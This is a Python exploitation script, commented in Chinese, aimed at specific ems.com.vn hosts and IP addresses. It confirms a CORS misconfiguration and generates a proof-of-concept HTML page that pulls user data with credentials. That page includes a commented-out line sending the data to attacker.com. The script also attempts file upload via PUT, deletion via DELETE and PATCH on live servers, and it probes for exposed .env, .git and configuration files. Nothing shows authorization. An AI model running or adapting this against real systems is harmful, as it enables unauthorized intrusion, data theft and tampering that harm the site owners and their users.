#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
验证和利用已确认的漏洞
"""

import requests
import urllib3
import json
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    漏洞利用验证 - 真实攻击链                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

# 已确认的漏洞
confirmed_vulns = {
    'admin.ems.com.vn': {
        'type': 'CORS配置错误',
        'details': 'Access-Control-Allow-Origin: *'
    },
    'webapp.ems.com.vn': {
        'type': '危险HTTP方法',
        'methods': ['PATCH']
    },
    'mail-vn.ems.com.vn': {
        'type': '危险HTTP方法',
        'methods': ['PUT', 'DELETE', 'PATCH']
    }
}

def exploit_cors(host):
    """利用 CORS 配置错误"""
    print(f"\n[*] 测试 CORS 漏洞利用: {host}")
    
    # 1. 确认漏洞
    url = f"https://{host}"
    headers = {'Origin': 'https://evil.com'}
    
    try:
        resp = requests.get(url, headers=headers, verify=False, timeout=5)
        acao = resp.headers.get('Access-Control-Allow-Origin', '')
        
        if acao == '*':
            print(f"  [✓] 确认 CORS 配置: {acao}")
            
            # 2. 寻找敏感端点
            sensitive_endpoints = [
                '/api/user', '/api/profile', '/api/account',
                '/api/admin', '/api/settings', '/api/config',
                '/user/info', '/account/details', '/profile'
            ]
            
            exploitable = []
            
            for endpoint in sensitive_endpoints:
                ep_url = f"{url}{endpoint}"
                try:
                    resp = requests.get(ep_url, headers=headers, verify=False, timeout=3)
                    if resp.status_code == 200:
                        # 检查是否返回敏感数据
                        if resp.headers.get('Content-Type', '').startswith('application/json'):
                            try:
                                data = resp.json()
                                if data and isinstance(data, (dict, list)):
                                    exploitable.append({
                                        'endpoint': endpoint,
                                        'data': data
                                    })
                            except:
                                pass
                except:
                    pass
            
            if exploitable:
                print(f"  [!] 发现可利用端点:")
                for exp in exploitable:
                    print(f"    - {exp['endpoint']}: {str(exp['data'])[:50]}...")
                
                # 3. 生成 PoC
                poc_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - {host}</title>
</head>
<body>
    <h1>CORS 漏洞利用 PoC</h1>
    <button onclick="exploit()">执行攻击</button>
    <div id="result"></div>
    
    <script>
    function exploit() {{
        fetch('https://{host}{exploitable[0]['endpoint']}', {{
            method: 'GET',
            credentials: 'include'
        }})
        .then(response => response.json())
        .then(data => {{
            document.getElementById('result').innerHTML = 
                '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
            // 发送数据到攻击者服务器
            // fetch('https://attacker.com/collect', {{
            //     method: 'POST',
            //     body: JSON.stringify(data)
            // }});
        }});
    }}
    </script>
</body>
</html>
"""
                poc_file = f"cors_poc_{host.replace('.', '_')}.html"
                with open(poc_file, 'w') as f:
                    f.write(poc_html)
                print(f"  [+] PoC 已生成: {poc_file}")
            else:
                print(f"  [-] 未发现包含敏感数据的端点")
        else:
            print(f"  [-] CORS 配置已修复或不存在")
    except Exception as e:
        print(f"  [!] 错误: {e}")

def exploit_http_methods(host, ip, methods):
    """利用危险 HTTP 方法"""
    print(f"\n[*] 测试危险 HTTP 方法: {host} ({ip})")
    
    base_url = f"http://{ip}"
    
    for method in methods:
        print(f"\n  [*] 测试 {method} 方法...")
        
        if method == 'PUT':
            # 尝试上传文件
            test_paths = [
                '/test.txt',
                '/upload/test.txt',
                '/static/test.txt',
                '/public/test.txt',
                '/files/test.txt'
            ]
            
            for path in test_paths:
                url = f"{base_url}{path}"
                data = f"Test upload via PUT method - {datetime.now()}"
                
                try:
                    resp = requests.put(url, data=data, verify=False, timeout=3)
                    if resp.status_code in [200, 201, 204]:
                        print(f"    [!] PUT 成功: {url}")
                        
                        # 验证文件是否存在
                        check_resp = requests.get(url, verify=False, timeout=3)
                        if check_resp.status_code == 200 and data in check_resp.text:
                            print(f"    [!!!] 文件上传成功并可访问!")
                            print(f"    [+] 漏洞确认: 任意文件上传")
                            return {'vulnerable': True, 'type': '任意文件上传', 'url': url}
                except:
                    pass
        
        elif method == 'DELETE':
            # 测试删除（但要小心）
            test_paths = [
                '/test/delete-test.txt',
                '/tmp/test.txt'
            ]
            
            for path in test_paths:
                url = f"{base_url}{path}"
                
                try:
                    # 先检查是否存在
                    check_resp = requests.get(url, verify=False, timeout=3)
                    if check_resp.status_code == 200:
                        # 尝试删除
                        del_resp = requests.delete(url, verify=False, timeout=3)
                        if del_resp.status_code in [200, 204]:
                            # 再次检查
                            verify_resp = requests.get(url, verify=False, timeout=3)
                            if verify_resp.status_code == 404:
                                print(f"    [!] DELETE 成功: {url}")
                                print(f"    [+] 漏洞确认: 任意文件删除")
                                return {'vulnerable': True, 'type': '任意文件删除', 'url': url}
                except:
                    pass
        
        elif method == 'PATCH':
            # 测试 PATCH
            api_endpoints = [
                '/api/user/1',
                '/api/config',
                '/api/settings'
            ]
            
            for endpoint in api_endpoints:
                url = f"{base_url}{endpoint}"
                patch_data = json.dumps({'test': 'patch_test'})
                headers = {'Content-Type': 'application/json'}
                
                try:
                    resp = requests.patch(url, data=patch_data, headers=headers, 
                                        verify=False, timeout=3)
                    if resp.status_code in [200, 204]:
                        print(f"    [!] PATCH 成功: {url}")
                        return {'vulnerable': True, 'type': 'PATCH方法可用', 'url': url}
                except:
                    pass
    
    return {'vulnerable': False}

def find_real_vulns(host, ip):
    """深入挖掘真实漏洞"""
    print(f"\n[*] 深入挖掘: {host} ({ip})")
    
    vulnerabilities = []
    
    # 1. 检查敏感文件
    sensitive_files = [
        '/.git/config',
        '/.env',
        '/config.php',
        '/wp-config.php',
        '/.htaccess',
        '/web.config',
        '/database.yml',
        '/config/database.yml',
        '/config.json',
        '/package.json',
        '/composer.json',
        '/robots.txt',
        '/crossdomain.xml',
        '/clientaccesspolicy.xml'
    ]
    
    for file in sensitive_files:
        url = f"http://{ip}{file}"
        try:
            resp = requests.get(url, verify=False, timeout=3, allow_redirects=False)
            if resp.status_code == 200:
                # 验证是否真的是敏感文件
                content = resp.text
                is_sensitive = False
                
                if '/.git/config' in file and '[core]' in content:
                    is_sensitive = True
                elif '/.env' in file and ('APP_KEY=' in content or 'DB_PASSWORD=' in content):
                    is_sensitive = True
                elif 'config.php' in file and ('$' in content or 'define(' in content):
                    is_sensitive = True
                elif '.json' in file:
                    try:
                        json.loads(content)
                        is_sensitive = True
                    except:
                        pass
                
                if is_sensitive:
                    print(f"  [!] 发现敏感文件: {file}")
                    print(f"      内容预览: {content[:100]}...")
                    vulnerabilities.append({
                        'type': '敏感文件泄露',
                        'file': file,
                        'url': url
                    })
        except:
            pass
    
    # 2. 检查备份文件
    backup_extensions = ['.bak', '.backup', '.old', '.orig', '~', '.swp']
    base_files = ['index.php', 'config.php', 'database.php', 'settings.php']
    
    for base in base_files:
        for ext in backup_extensions:
            backup_file = f"/{base}{ext}"
            url = f"http://{ip}{backup_file}"
            try:
                resp = requests.get(url, verify=False, timeout=3, allow_redirects=False)
                if resp.status_code == 200 and len(resp.text) > 100:
                    print(f"  [!] 发现备份文件: {backup_file}")
                    vulnerabilities.append({
                        'type': '备份文件泄露',
                        'file': backup_file,
                        'url': url
                    })
            except:
                pass
    
    return vulnerabilities

# 执行利用测试
print("[*] 开始漏洞利用验证...\n")

all_exploits = []

# 1. CORS 漏洞利用
if 'admin.ems.com.vn' in confirmed_vulns:
    exploit_cors('admin.ems.com.vn')

# 2. HTTP 方法漏洞利用
http_method_targets = [
    {'host': 'webapp.ems.com.vn', 'ip': '222.255.250.228', 'methods': ['PATCH']},
    {'host': 'mail-vn.ems.com.vn', 'ip': '222.255.250.247', 'methods': ['PUT', 'DELETE', 'PATCH']}
]

for target in http_method_targets:
    result = exploit_http_methods(target['host'], target['ip'], target['methods'])
    if result['vulnerable']:
        all_exploits.append(result)

# 3. 深入挖掘
deep_scan_targets = [
    {'host': 'webapp.ems.com.vn', 'ip': '222.255.250.228'},
    {'host': 'mail-vn.ems.com.vn', 'ip': '222.255.250.247'},
    {'host': 'internal.ems.com.vn', 'ip': '222.255.250.234'}
]

for target in deep_scan_targets:
    vulns = find_real_vulns(target['host'], target['ip'])
    if vulns:
        all_exploits.extend(vulns)

# 总结
print(f"\n\n{'='*60}")
print(f"[+] 漏洞利用总结")
print(f"{'='*60}")

if all_exploits:
    print(f"\n成功利用 {len(all_exploits)} 个漏洞:\n")
    for exploit in all_exploits:
        print(f"  - {exploit['type']}")
        if 'url' in exploit:
            print(f"    URL: {exploit['url']}")
        if 'file' in exploit:
            print(f"    文件: {exploit['file']}")
    
    # 保存利用报告
    report_file = f"exploit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump({
            'time': datetime.now().isoformat(),
            'exploits': all_exploits
        }, f, ensure_ascii=False, indent=2)
    print(f"\n[+] 利用报告已保存: {report_file}")
else:
    print(f"\n[-] 未能成功利用任何漏洞")

print(f"\n[+] 测试完成！")